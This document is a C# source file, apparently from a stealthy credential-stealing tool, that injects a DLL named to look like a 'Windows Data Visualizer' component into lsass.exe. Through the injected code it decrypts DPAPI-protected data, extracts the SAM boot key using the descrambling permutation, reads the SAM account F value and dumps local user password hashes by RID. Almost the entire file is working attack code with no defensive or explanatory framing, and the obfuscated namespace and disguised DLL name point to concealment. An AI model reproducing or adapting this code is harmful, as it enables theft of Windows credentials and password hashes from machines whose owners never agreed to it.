using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace FE3458D878534D9183D79D9318BB08C0.Data
{
	internal static class LsassInjector
	{
		static LsassInjector()
		{
			LsassInjector.Injector = new Utilities.DllInjector("Windows Data Visualizer.LSASS.dll", "lsass.exe");
		}

		#region Members
		private static Utilities.DllInjector Injector;

		private static readonly byte[] BootKeyMatrix = new byte[] { 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 };
		#endregion

		#region Properties
		public static bool IsInjected
		{
			get
			{
				return LsassInjector.Injector.IsInjected;
			}
		}
		#endregion

		#region Methods
		public static bool Inject()
		{
			return LsassInjector.Injector.Inject();
		}

		public static bool Eject()
		{
			return LsassInjector.Injector.Eject();
		}

		public static byte[] CryptUnprotectData(byte[] encryptedData, byte[] optionalEntropy, DataProtectionScope scope)
		{
			if (encryptedData == null)
				throw new ArgumentNullException("encryptedData");

			if (!LsassInjector.IsInjected)
				throw new InvalidOperationException("Inject has not completed succesfully.");

			LSASSCryptUnprotectDataResult Result = default(LSASSCryptUnprotectDataResult);
			LSASSCryptUnprotectDataParam Param = new LSASSCryptUnprotectDataParam();

			int lpNumBytesWritten = 0;
			int lpNumberOfBytesRead = 0;

			int pbDataBytesWritten = 0;
			int pbOptDataBytesWritten = 0;

			IntPtr hRemoteMem = IntPtr.Zero;
			IntPtr pResult = IntPtr.Zero;

			try
			{
				uint dwFlags = 1;

				if (scope == DataProtectionScope.LocalMachine)
					dwFlags |= 4;

				Param.cbData = (uint)encryptedData.Length;
				Param.cbOptData = (optionalEntropy == null) ? 0U : (uint)optionalEntropy.Length;
				Param.dwFlags = dwFlags;
				Param.pbData = LsassInjector.Injector.WriteMemory(encryptedData, out pbDataBytesWritten);

				if (pbDataBytesWritten != encryptedData.Length)
					throw new Win32Exception(Marshal.GetLastWin32Error(), "LsassInjector.Injector.WriteMemory failed");

				if (optionalEntropy != null)
				{
					Param.pbOptData = LsassInjector.Injector.WriteMemory(optionalEntropy, out pbOptDataBytesWritten);

					if (pbOptDataBytesWritten != optionalEntropy.Length)
						throw new Win32Exception(Marshal.GetLastWin32Error(), "LsassInjector.Injector.WriteMemory failed");
				}

				hRemoteMem = LsassInjector.Injector.WriteMemory<LSASSCryptUnprotectDataParam>(Param, out lpNumBytesWritten);
				pResult = LsassInjector.Injector.CallFunction("LSASSCryptUnprotectData", hRemoteMem);
				Result = LsassInjector.Injector.ReadMemory<LSASSCryptUnprotectDataResult>(pResult, out lpNumberOfBytesRead);

				if (Result.cbWin32Error != 0)
					Utilities.Utilities.Log(new Win32Exception(Result.cbWin32Error));

				if (Result.cbExCode != 0)
					Utilities.Utilities.Log("LSASSCryptUnprotectData failed with exception code 0x{0}\r\n(See http://msdn.microsoft.com/en-us/library/cc704588.aspx)", Convert.ToString(Result.cbExCode, 16).ToUpper());

				if (!Result.bSuccess)
					throw new CryptographicException(Result.cbWin32Error);

				if (Result.pbData == IntPtr.Zero)
					throw new OutOfMemoryException();

				byte[] destination = new byte[Result.cbData];
				LsassInjector.Injector.ReadMemory(Result.pbData, destination);
				return destination;
			}
			finally
			{
				if (Param.pbData != IntPtr.Zero)
					LsassInjector.Injector.FreeMemory(Param.pbData, pbDataBytesWritten);

				if (Param.pbOptData != IntPtr.Zero
					&& optionalEntropy != null)
					LsassInjector.Injector.FreeMemory(Param.pbData, pbOptDataBytesWritten);

				if (Result.pbData != IntPtr.Zero)
					LsassInjector.Injector.FreeMemory(Result.pbData, (int)Result.cbData);

				if (pResult != IntPtr.Zero && lpNumberOfBytesRead != 0)
					LsassInjector.Injector.FreeMemory(pResult, lpNumberOfBytesRead);

				if (hRemoteMem != IntPtr.Zero)
					LsassInjector.Injector.FreeMemory(hRemoteMem, lpNumBytesWritten);
			}
		}

		public static byte[] GetBootKey()
		{
			if (!LsassInjector.IsInjected)
				throw new InvalidOperationException("Inject has not completed succesfully.");

			IntPtr pResult = IntPtr.Zero;
			int lpNumberOfBytesRead = 0;

			int lpNumberOfBookKeyJDBytesRead = 0;
			int lpNumberOfBookKeySkew1BytesRead = 0;
			int lpNumberOfBookKeyGBGBytesRead = 0;
			int lpNumberOfBookKeyDataBytesRead = 0;

			LSASSGetBootKeyResult Result = default(LSASSGetBootKeyResult);

			try
			{
				pResult = LsassInjector.Injector.CallFunction("LSASSGetBootKey");
				Result = LsassInjector.Injector.ReadMemory<LSASSGetBootKeyResult>(pResult, out lpNumberOfBytesRead);

				if (Result.cbWin32Error != 0)
					Utilities.Utilities.Log(new Win32Exception(Result.cbWin32Error));

				if (Result.cbExCode != 0)
					Utilities.Utilities.Log("LSASSUserAccountHashes failed with exception code 0x{0}\r\n(See http://msdn.microsoft.com/en-us/library/cc704588.aspx)", Convert.ToString(Result.cbExCode, 16).ToUpper());

				StringBuilder ClassData = new StringBuilder((int)(Result.cbBootKeyJD + Result.cbBootKeySkew1 + Result.cbBootKeyGBG + Result.cbBootKeyData));
				ClassData.Append(LsassInjector.Injector.ReadStringUni(Result.pbBootKeyJD, (int)Result.cbBootKeyJD, out lpNumberOfBookKeyJDBytesRead));
				ClassData.Append(LsassInjector.Injector.ReadStringUni(Result.pbBootKeySkew1, (int)Result.cbBootKeySkew1, out lpNumberOfBookKeySkew1BytesRead));
				ClassData.Append(LsassInjector.Injector.ReadStringUni(Result.pbBootKeyGBG, (int)Result.cbBootKeyGBG, out lpNumberOfBookKeyGBGBytesRead));
				ClassData.Append(LsassInjector.Injector.ReadStringUni(Result.pbBootKeyData, (int)Result.cbBootKeyData, out lpNumberOfBookKeyDataBytesRead));

				byte[] _BootKey = new byte[ClassData.Length / 2];

				for (int i = 0; i < _BootKey.Length; i++)
					_BootKey[i] = Convert.ToByte(ClassData.ToString(i * 2, 2), 16);

				byte[] BootKey = new byte[_BootKey.Length];

				for (int i = 0; i < _BootKey.Length; i++)
					BootKey[i] = _BootKey[LsassInjector.BootKeyMatrix[i]];

				return BootKey;
			}
			finally
			{
				if (Result.pbBootKeyData != IntPtr.Zero && lpNumberOfBookKeyDataBytesRead != 0)
					LsassInjector.Injector.FreeMemory(Result.pbBootKeyData, lpNumberOfBookKeyDataBytesRead);

				if (Result.pbBootKeyGBG != IntPtr.Zero && lpNumberOfBookKeyGBGBytesRead != 0)
					LsassInjector.Injector.FreeMemory(Result.pbBootKeyGBG, lpNumberOfBookKeyGBGBytesRead);

				if (Result.pbBootKeyJD != IntPtr.Zero && lpNumberOfBookKeyJDBytesRead != 0)
					LsassInjector.Injector.FreeMemory(Result.pbBootKeyJD, lpNumberOfBookKeyJDBytesRead);

				if (Result.pbBootKeySkew1 != IntPtr.Zero && lpNumberOfBookKeySkew1BytesRead != 0)
					LsassInjector.Injector.FreeMemory(Result.pbBootKeySkew1, lpNumberOfBookKeySkew1BytesRead);

				if (pResult != IntPtr.Zero && lpNumberOfBytesRead != 0)
					LsassInjector.Injector.FreeMemory(pResult, lpNumberOfBytesRead);
			}
		}

		public static byte[] GetSamAccountF()
		{
			if (!LsassInjector.IsInjected)
				throw new InvalidOperationException("Inject has not completed succesfully.");

			IntPtr pResult = IntPtr.Zero;
			int lpNumberOfBytesRead = 0;

			LSASSGetSamAccountFResult Result = default(LSASSGetSamAccountFResult);

			try
			{
				pResult = LsassInjector.Injector.CallFunction("LSASSGetSamAccountF");
				Result = LsassInjector.Injector.ReadMemory<LSASSGetSamAccountFResult>(pResult, out lpNumberOfBytesRead);

				byte[] SamAccountF = new byte[Result.cbData];
				LsassInjector.Injector.ReadMemory(Result.pbData, SamAccountF);
				return SamAccountF;
			}
			finally
			{
				if (Result.pbData != IntPtr.Zero && Result.cbData != 0)
					LsassInjector.Injector.FreeMemory(Result.pbData, (int)Result.cbData);

				if (pResult != IntPtr.Zero && lpNumberOfBytesRead != 0)
					LsassInjector.Injector.FreeMemory(pResult, lpNumberOfBytesRead);
			}
		}

		public static UserAccountHash[] GetUserAccountHashes()
		{
			if (!LsassInjector.IsInjected)
				throw new InvalidOperationException("Inject has not completed succesfully.");

			List<UserAccountHash> rData = new List<UserAccountHash>();

			IntPtr pResult = IntPtr.Zero;
			int lpNumberOfBytesRead = 0;
			
			LSASSUserAccountHashesResult Result = default(LSASSUserAccountHashesResult);

			try
			{
				pResult = LsassInjector.Injector.CallFunction("LSASSUserAccountHashes");
				Result = LsassInjector.Injector.ReadMemory<LSASSUserAccountHashesResult>(pResult, out lpNumberOfBytesRead);

				if (Result.cbWin32Error != 0)
					Utilities.Utilities.Log(new Win32Exception(Result.cbWin32Error));

				if (Result.cbExCode != 0)
					Utilities.Utilities.Log("LSASSUserAccountHashes failed with exception code 0x{0}\r\n(See http://msdn.microsoft.com/en-us/library/cc704588.aspx)", Convert.ToString(Result.cbExCode, 16).ToUpper());

				for (uint i = 0; i < Result.cbCount; i++)
				{
					IntPtr ppHash = new IntPtr(Result.pbData.ToInt64() + i * IntPtr.Size);

					int lpNumberOfHashBytesRead = 0;
					int lpNumberOfNameBytesRead = 0;

					IntPtr pHash = IntPtr.Zero;
					LSASSUserAccountHash Hash = default(LSASSUserAccountHash);

					try
					{
						pHash = LsassInjector.Injector.ReadIntPtr(ppHash);

						if (pHash == IntPtr.Zero)
							continue;

						Hash = LsassInjector.Injector.ReadMemory<LSASSUserAccountHash>(pHash, out lpNumberOfHashBytesRead);

						if (Hash.cbName != 8
							|| Hash.skName == IntPtr.Zero
							|| Hash.cbSize == 0
							|| Hash.pbData == IntPtr.Zero)
							continue;

						byte[] pbData = new byte[Hash.cbSize];
						LsassInjector.Injector.ReadMemory(Hash.pbData, pbData);

						uint RID = Convert.ToUInt32(LsassInjector.Injector.ReadStringUni(Hash.skName, (int)Hash.cbName, out lpNumberOfNameBytesRead), 16);
						
						rData.Add(new UserAccountHash
						{
							pbData = pbData,
							RID = RID
						});
					}
					catch (Exception e)
					{
						Utilities.Utilities.Log(e);
					}
					finally
					{
						if (Hash.skName != IntPtr.Zero && lpNumberOfNameBytesRead != 0)
							LsassInjector.Injector.FreeMemory(Hash.skName, lpNumberOfNameBytesRead);

						if (Hash.pbData != IntPtr.Zero && Hash.cbSize != 0)
							LsassInjector.Injector.FreeMemory(Hash.pbData, (int)Hash.cbSize);

						if (pHash != IntPtr.Zero && lpNumberOfHashBytesRead != 0)
							LsassInjector.Injector.FreeMemory(pHash, lpNumberOfHashBytesRead);
					}
				}
			}
			finally
			{
				if (Result.pbData != IntPtr.Zero && Result.cbCount != 0)
					LsassInjector.Injector.FreeMemory(Result.pbData, (int)(Result.cbCount * IntPtr.Size));

				if (pResult != IntPtr.Zero && lpNumberOfBytesRead != 0)
					LsassInjector.Injector.FreeMemory(pResult, lpNumberOfBytesRead);
			}

			return rData.ToArray();
		}
		#endregion

		#region Structures
		private struct LSASSCryptUnprotectDataResult
		{
			public bool bSuccess;
			public int cbWin32Error;
			public uint cbExCode;

			public uint cbData;
			public IntPtr pbData;
		}

		private struct LSASSCryptUnprotectDataParam
		{
			public uint cbData;
			public IntPtr pbData;

			public uint cbOptData;
			public IntPtr pbOptData;

			public uint dwFlags;
		}

		private struct LSASSGetBootKeyResult
		{
			public bool bSuccess;
			public int cbWin32Error;
			public uint cbExCode;

			public uint cbBootKeyJD;
			public IntPtr pbBootKeyJD;

			public uint cbBootKeySkew1;
			public IntPtr pbBootKeySkew1;

			public uint cbBootKeyGBG;
			public IntPtr pbBootKeyGBG;

			public uint cbBootKeyData;
			public IntPtr pbBootKeyData;
		}

		private struct LSASSGetSamAccountFResult
		{
			public bool bSuccess;
			public int cbWin32Error;
			public uint cbExCode;

			public uint cbData;
			public IntPtr pbData;
		}

		private struct LSASSUserAccountHashesResult
		{
			public bool bSuccess;
			public int cbWin32Error;
			public uint cbExCode;

			public uint cbCount;
			public IntPtr pbData;
		}

		private struct LSASSUserAccountHash
		{
			public uint cbName;
			public IntPtr skName;

			public uint cbSize;
			public IntPtr pbData;
		}

		public struct UserAccountHash
		{
			public byte[] pbData;
			public uint RID;
		}
		#endregion
	}
}